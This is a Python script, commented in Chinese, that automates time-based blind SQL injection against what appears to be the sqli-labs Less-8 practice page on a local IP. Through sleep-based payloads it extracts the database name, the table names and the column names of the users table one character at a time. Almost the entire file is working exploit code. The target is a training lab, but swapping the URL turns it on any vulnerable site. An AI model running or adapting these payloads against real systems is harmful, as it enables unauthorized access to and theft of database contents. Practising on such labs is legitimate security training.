from concurrent.futures import ThreadPoolExecutor
"""本成品
肝不动了，还是菜了点
造的轮子翻了，我觉得是车的问题   sqlmap yyds
"""
import requests
import time
target='http://192.168.46.128/sqli/Less-8/index.php?id=1'
name=[]
def get_dblength():                                     #获取数据库长度
    for i in range(1,20):
        url=target+f"' and length(database())={i} and sleep(3) --+"
        star=time.time()
        requests.get(url)
        time1 = time.time()-star
        if time1>2:
            print('数据库长度为：',i)
            return i
def get_dbContent(dbl):                         #根据长度获取数据库名称
    print('数据库名称为： ',end='')
    for j in range(1,dbl+1):
        for k in  range(65,123):
            url=target+f"' and ascii(substr(database(),{j},1))={k} and sleep(3) --+"
            star=time.time()
            requests.get(url)
            time1=time.time()-star
            if time1>2:
                print(chr(k),end='')
    print('')
def get_tbGeshu():                                              #获取表的个数
    for i in range(1,10):
        url=target+f"' and (select count(table_name) from information_schema.tables where table_schema=database())={i} and sleep(3) --+"
        star=time.time()
        requests.get(url)
        time1=time.time()-star
        if time1>2:
            print('表的个数是： ',i)
            return i
def get_tblength(i):        #根据个数获取表的长度    i=4
    for j in range(i):
        for k in range(1,10):
            url=target+f"' and length(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),1))={k}  and sleep(3) -- -"
            star = time.time()
            requests.get(url)
            time1=time.time()-star
            if time1>2:
                print(f'第{j+1}张表的长度为',k)
                for x in range(1,k+1):      #猜表的内容
                    for c in range(65,123):
                        url = target+f"' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{x},1))={c} and sleep(3) --+"
                        star = time.time()
                        requests.get(url)
                        time1 = time.time() - star
                        if time1 > 2:
                            print(chr(c),end='')

                print('\n')
    print('表名猜解完毕')
def get_col_Geshu():
    tb_name=input('请输入获取字段数的表：')
    for i in range(1,50):
        url=target+f"' and (select count(column_name) from information_schema.columns where table_name='{tb_name}' and table_schema=database())={i}   and sleep(3) -- -"
        star=time.time()
        requests.get(url)
        time1 = time.time()-star
        if time1>2:
            print(tb_name+'的字段数为" ',i)
            return i
def get_col_Name():
    tb_name ='users' #input('请输入获取字段的表名： ')
    colnum=3#int(input('请输入方才获取到的字段数： '))
    columns_list = []
    for j in range(colnum+1):
        a=''

        for k in range(1,10):    #某个具体字段长度
            url=target+f"' and length(substr((select column_name from information_schema.columns where table_name='{tb_name}' and table_schema=database() limit {j},1),1))={k}  and sleep(3) -- -"
            star = time.time()
            requests.get(url)
            time1=time.time()-star
            if time1>2:
                print(f'第{j+1}个字段的长度为',k)
                for x in range(1,k+1):      #猜字段的内容
                    for c in range(65,123):
                        url = target+f"' and ascii(substr((select column_name from information_schema.columns where table_name='{tb_name}' and table_schema=database() limit {j},1),{x},1))={c} and sleep(3) --+"
                        star = time.time()
                        requests.get(url)
                        time1 = time.time() - star
                        if time1 > 2:
                            print(chr(c),end='')
                            a=a+chr(c)

                print('\n')
                columns_list.append(a)
    print(tb_name+'的字段为： ',columns_list)
def col_content():
    pass


dbL=get_dblength()
get_dbContent(dbL)
tbnum=get_tbGeshu()
get_tblength(tbnum)
get_col_Geshu()
get_col_Name()




